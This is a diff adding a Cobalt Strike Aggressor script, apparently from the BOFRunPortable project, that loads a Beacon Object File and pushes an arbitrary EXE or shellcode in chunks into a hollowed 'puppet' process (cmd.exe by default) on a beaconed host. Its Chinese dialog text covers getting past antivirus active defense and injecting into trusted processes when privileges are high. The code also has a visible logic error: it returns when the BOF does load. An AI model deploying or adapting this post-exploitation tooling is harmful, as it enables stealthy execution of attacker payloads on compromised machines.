@@ -1,0 +1,98 @@
+sub readAllFileData {
+    $fileHandle = openf($1);
+    $fileData = readb($fileHandle, -1);
+    closef($fileHandle);  
+    return $fileData;  
+}
+
+sub loadBOF {
+	$barch  = barch($1);
+	$nativeBOFPath = script_resource("bin/escalation/BOFRunPortable. $+ $barch $+ .obj") ;
+    if(-exists $nativeBOFPath){
+        return readAllFileData($nativeBOFPath);        
+    }else{
+        blog($1, "[!] The test_pack native runtime file $nativeBOFPath doesn't exist");
+        return $null;
+    }
+}
+
+item "BOFRunPortable[PE]"{
+  local('$bid');
+  foreach $bid ($1){
+    &runAnyWhereDialog($bid);
+  }
+}
+
+# $state
+# 1 upload
+# 2 upload complete
+# 9999 frp already in memory
+sub runAnyWhere{
+  local('$bid $shellcode_data $state $count $pename $mapname')
+  $state = 1;
+  $count = 0;
+  $bid = $3['bid'];
+  $pename = $3['target'].$3['param'];
+  #$mapname = $3['map'];
+  btask($bid, "******* RunAnyWhere v0.1 *******");
+  btask($bid, "https://github.com/9bie/BOFRunPortable");
+
+  # read frp shellcode
+  $shellcode_path = $3['file'] ;
+  if(-exists $shellcode_path){
+    $shellcode_data = readAllFileData($shellcode_path)
+  }else{
+    blog($bid,"[!] The shellcode file $shellcode_path doesn't exist");
+    return;
+  }
+
+  # load bof
+  $bofBytes = loadBOF($bid);
+  if($bofBytes != $null){
+      return;
+  }
+
+  $total_size = strlen($shellcode_data);
+  $chunk_size = $total_size;
+  blog($bid,"[!] Total size: $total_size chunk_size: $chunk_size Map_name: $mapname");
+  # If frp has already been initialized, execute it directly
+
+  # 900k chunks sent to leave room for protocol data too
+  $chunkSize = 1024 * 900 ;
+
+  # must split shellcode
+  $numChunks = $total_size / $chunkSize;
+  $remainder = $total_size % $chunkSize;
+  $index = 0;
+
+  for($i = 0; $i < $numChunks; $i++){ 
+        $chunk = substr($shellcode_data, $index, $index + $chunkSize);
+    	  $args = bof_pack($bid, "ziiiib",$pename , $state, $total_size, $index , $chunkSize, $chunk) ;
+        $index += $chunkSize;
+        $count = $count + 1;
+        # when("beacon_output_alt", $this);
+        # yield;
+        beacon_inline_execute($bid, $bofBytes, "go", $args);
+    }
+  
+  if($remainder > 0){
+      $state = 2;
+      $chunk = substr($shellcode_data, $numChunks * $chunkSize, ($numChunks * $chunkSize) + $remainder + 1);
+      $args = bof_pack($bid, "ziiiib", $pename , $state, $total_size, $index , $remainder, $chunk) ;
+      btask($1, "upload end block size: $remainder !");
+      beacon_inline_execute($bid, $bofBytes, "go", $args);
+      btask($1, "upload finish!");
+    }
+}
+
+sub runAnyWhereDialog{
+  #$random = "random".rand(1000000);
+	$dialog = dialog("BOFRunPortable[PE]",%(bid => $1,target => "C:\\Windows\\System32\\cmd.exe ", param => "\"cmd /c whoami>C:\\whoami.txt\"" ,map => $random), &runAnyWhere);
+	dialog_description($dialog, "执行无回显，360会拦截进程链，傀儡进程是64位只能起64位程序，32位同理！非免杀用，不过主动防御！高权限时可先注入到其他可信进程后再使用！");
+	drow_text($dialog, "target",  "傀儡进程路径:");
+  drow_file($dialog, "file", "要运行的EXE:");
+	drow_text($dialog, "param",  "运行EXE参数:");
+  #drow_text($dialog, "map",  "标识ID(不要用同一个ID):");
+	dbutton_action($dialog, "确定");
+	dialog_show($dialog);
+}
